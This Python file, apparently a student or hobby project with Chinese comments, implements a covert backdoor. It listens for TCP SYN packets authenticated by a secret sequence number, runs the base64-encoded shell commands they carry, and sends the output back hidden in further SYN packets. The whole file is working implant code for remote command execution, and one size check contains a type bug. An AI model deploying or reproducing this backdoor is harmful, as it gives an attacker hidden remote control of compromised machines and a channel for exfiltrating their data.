import base64
from scapy.all import *
from scapy.all import conf
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from termcolor import cprint

# 禁止Scapy的所有输出
conf.verb = 0

class ReceiveData():
    def __init__(self,filter):
        self.filter = filter
        self.total = 0
        self.raw={}
        self.data=""
        self.packets = None

    # 假设获取到的数据包都是端对端，没有丢包或第三方干扰
    def Receive(self):
        # 先获取第一个数据包
        packets = sniff(filter=self.filter, count=1,timeout=1)
        self.packets = packets
        if len(packets) == 0:
            self.data = ""
            return

        data = packets[0].getlayer(Raw).load.decode('utf-8')
        # 去除最后的换行符
        if data.endswith('\n'):
            data=data[:-1]
        # 如果data形式为：Nums:total_num:可继续拓展
        if data.startswith("Nums:"):
            data = data.split(":")
            self.total = int(data[1])
            # 由于可能会抓包错误，这里包的个数设置为total+3
            timeout=self.total//20+0.8
            addcount=self.total//5+1
            packets = sniff(filter=self.filter, count=addcount,timeout=timeout)
            # 如果包个数不为total，说明有丢包
            if len(packets) < self.total:
                data=""
                return

            #后续每个包格式为totalnum:num:data
            for packet in packets:
                data = packet.getlayer(Raw).load.decode('utf-8')
                if data.endswith('\n'):
                    data = data[:-1]

                if(data.startswith(str(self.total)+":")):
                    data = data.split(":")
                    self.raw[int(data[1])] = data[2]
                else:
                    pass

            # 检查是否有丢包
            for i in range(self.total):
                if i not in self.raw.keys():
                    cprint("Packet loss! May thr network is unstable!","red")
                    data=""
                    return

            # 按照顺序拼接数据
            for i in range(self.total):
                # 先base64解码
                self.raw[i]=base64.b64decode(self.raw[i].encode()).decode()
                self.data += self.raw[i]


        elif data.startswith("Num:"):
            data=data.split(":")[1]
            self.data = data
            # base64解码
            self.data = base64.b64decode(self.data).decode()
    # 直接返回最后的数据

    def main(self):
        self.Receive()
        return self.data,self.packets

class SendData():
    def __init__(self,src_ip,dst_ip,src_port,dst_port,seq_num,data):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.seq_num = seq_num
        self.data = data
        self.total = 0
        self.raw = {}
    def Send(self,data):
        self.data = data
        # 每个数据包最多发送100个字符
        if len(self.data) > 100:
            ret=self.data%100
            if(ret!=0):
                self.total = len(self.data) // 100 + 1
            else:
                self.total = len(self.data) // 100
            # 先发送一个数据包，告诉对方总共有多少个数据包
            send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, "Nums:" + str(self.total))
            # 给对方一点时间
            time.sleep(0.5)
            # 每个数据包格式为：Nums:totalnum:num:data
            for i in range(self.total):
                self.raw[i] = self.data[i * 100:(i + 1) * 100]
                # base64编码
                self.raw[i]=base64.b64encode(self.raw[i].encode()).decode()
                send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, str(self.total)+":" + str(i) + ":" + self.raw[i])

        else:
            self.total = 1
            # base64编码
            self.data=base64.b64encode(self.data.encode()).decode()
            # 发送一个数据包
            send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, "Num:" + self.data)

def send_syn_packet(src_ip, dst_ip, src_port, dst_port, seq_num, command):
    # 创建Ethernet层
    eth = Ether()
    # 创建IP层
    ip = IP(src=src_ip, dst=dst_ip)
    # 创建TCP层，设置SYN标志
    tcp = TCP(sport=src_port, dport=dst_port, flags='S', seq=seq_num)
    # 创建Raw层，携带自定义数据
    raw = Raw(load=command)
    # 组合并发送数据包
    packet = eth/ip/tcp/raw
    sendp(packet, verbose=0)


def execute_command(command):
    # 执行命令并获取输出
    try:
        # 合并标准输出和错误输出
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        # 将输出转换为字符串
        output_str = output.decode('utf-8')
    except Exception as e:
        output_str = str(e)
    return output_str

def packet_filter(packet,passwd):
    # 检查数据包是否包含TCP层
    if packet[TCP].seq == passwd:
        return True
    return False


# TODO:使用tcp syn包进行通信
def receive_syn_ack_packet(port,passwd):
    # 过滤条件:通过tcp协议，目的端口为port,并且为syn包,且seq_num=password
    filter = f'tcp and dst port {port} and tcp[tcpflags] & tcp-syn != 0'
    R=ReceiveData(filter)
    # 抓取数据包：此处在抓取到数据包后会阻塞，直到抓取到数据包
    data,packets=R.main()
    if len(packets) == 0:
        return
    if(packet_filter(packets[0],passwd) is False):
        return
    try:
        command = data
        if command == 'close':
            exit(0)

        # 使用system执行系统命令,并且将raw层数据作为命令的输入，得到命令的结果而不是是否成功的返回值
        result=execute_command(command)
        # 将命令的结果作为raw层数据发送给发送方
        # 得到packets中的ip源地址、源端口，目的地址
        src_ip=packets[0].getlayer(IP).src
        src_port=packets[0].getlayer(TCP).sport
        my_ip=packets[0].getlayer(IP).dst
        my_port=packets[0].getlayer(TCP).dport
        # 发送数据包
        R=SendData(my_ip,src_ip,my_port,src_port,passwd,"")
        R.Send(result)
    except Exception as e:
        pass

if __name__ == '__main__':
    args=sys.argv
    if len(args) != 3:
        print("Usage:python3 Receiver.py port passwd")
        exit(0)
    port=int(args[1])
    passwd=int(args[2])
    # 持续监听1234端口
    while True:
        # 接受syn-syn包，输出raw层的数据
        receive_syn_ack_packet(port,passwd)
